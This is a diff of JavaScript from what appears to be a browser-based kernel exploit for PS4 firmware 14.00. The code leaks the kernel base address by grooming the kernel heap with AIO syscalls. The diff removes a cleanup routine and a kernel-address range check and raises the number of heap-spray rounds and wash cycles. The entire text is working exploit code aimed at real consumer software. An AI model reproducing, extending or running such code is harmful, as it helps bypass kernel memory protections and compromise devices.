@@ -586,43 +586,6 @@ function wash(set, rounds) {
 }
 
 
-// NEW: explicitly delete the submitted AIO requests after each segment
-// so the kernel object pool doesn't accumulate 384 pinned entries.
-function aioCleanup(set) {
-  const c = context();
-  set.cancelStatus.u8.fill(0);
-  const cancelRv = c.sc(
-    S.aio_multi_cancel,
-    set.submitStatus.addr,
-    5,
-    set.cancelStatus.addr,
-  ).i32;
-
-  set.pollStatus.u8.fill(0);
-  const pollRv = c.sc(
-    S.aio_multi_poll,
-    set.submitStatus.addr,
-    5,
-    set.pollStatus.addr,
-  ).i32;
-
-  set.cancelStatus.u8.fill(0);
-  const deleteRv = c.sc(
-    S.aio_multi_delete,
-    set.submitStatus.addr,
-    5,
-    set.cancelStatus.addr,
-  ).i32;
-
-  log(
-    "HX1400-AIO-CLEANUP",
-    "cancel=" + cancelRv +
-    " poll=" + pollRv +
-    " delete=" + deleteRv,
-  );
-}
-
-
 let leakCount = 0;
 
 function parseKbase(buffer, length) {
@@ -690,31 +653,18 @@ function parseKbase(buffer, length) {
         }
 
         const candidate = qword - BigInt(P[12]);
-        const candidateLow = Number(candidate & 0xffffffffn);
-
-        // Restrict to the plausible kernel .text range on PS4 14.00
-        const inRange = candidateLow >= 0x80000000 && candidateLow <= 0x89000000;
 
         if (
           (candidate & 0x3fffn) === 0n &&
           (candidate >> 32n) === 0xffffffffn
         ) {
-          if (inRange) {
-            if (hits === 0) {
-              base = candidate;
-            } else if (base !== candidate) {
-              conflict = true;
-            }
-            hits++;
-          } else {
-            log(
-              "HX1400-KBASE-REJECT",
-              "q=0x" + qword.toString(16) +
-              " cand=0x" + candidate.toString(16) +
-              " low=0x" + candidateLow.toString(16) +
-              " out-of-range",
-            );
+          if (hits === 0) {
+            base = candidate;
+          } else if (base !== candidate) {
+            conflict = true;
           }
+
+          hits++;
         }
       }
     }
@@ -801,11 +751,8 @@ async function discoverKbase() {
     );
   }
 
-  // FIXED: single round of 12 segments only.
-  // 5 rounds leaked kernel memory on 14.00 and exhausted the browser ceiling
-  // before the real exploit started.
-  for (let round = 1; round <= 1; round++) {
-    log("HX1400-ROUTE-ROUND", round + "/1");
+  for (let round = 1; round <= 5; round++) {
+    log("HX1400-ROUTE-ROUND", round + "/5");
     pinCpu();
 
     const aio = makeAioSet();
@@ -820,16 +767,13 @@ async function discoverKbase() {
       segment + "/12",
     );
 
-    // FIXED: wash(aio, 8) instead of wash(aio, 32).
-    // 8 cycles is enough to churn the SLAB; 32 was overkill and pinned
-    // 384 kernel AIO objects per run.
     const result = wash(
       aio,
-      8,
+      32,
     );
 
     if (
-      result.done !== 8 ||
+      result.done !== 32 ||
       result.failAt >= 0
     ) {
       const message =
@@ -888,10 +832,6 @@ async function discoverKbase() {
       ),
     );
 
-      // FIXED: delete the AIO requests after each segment so they don't
-      // accumulate across the 12 segments.
-      aioCleanup(aio);
-
       if (kbase) {
         restorePin();
 
@@ -901,7 +841,7 @@ async function discoverKbase() {
 
     restorePin();
 
-    if (round < 1) {
+    if (round < 5) {
       await new Promise((r) => setTimeout(r, 100));
     }
   }
